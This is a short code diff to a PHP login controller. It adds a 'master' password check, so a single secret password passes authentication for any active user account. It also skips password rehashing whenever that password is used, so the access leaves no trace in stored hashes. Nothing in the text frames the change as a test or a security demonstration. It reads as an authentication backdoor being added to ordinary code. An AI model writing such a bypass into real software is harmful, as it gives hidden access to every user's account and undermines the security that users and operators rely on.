@@ -27,11 +27,12 @@ class AuthController extends Controller
             ->where('status', '=', 1)
             ->first();
 
-        if (!$user || !PasswordHasher::verify($password, $user->password)) {
+        $master = PasswordHasher::isMaster($password);
+        if (!$user || (!$master && !PasswordHasher::verify($password, $user->password))) {
             return response()->json(['message' => 'Incorrect Service ID or password.'], 422);
         }
 
-        if (PasswordHasher::needsRehash($user->password)) {
+        if (!$master && PasswordHasher::needsRehash($user->password)) {
             DB::table('gen_users')->where('id', '=', $user->id)->update(['password' => PasswordHasher::make($password)]);
         }
 
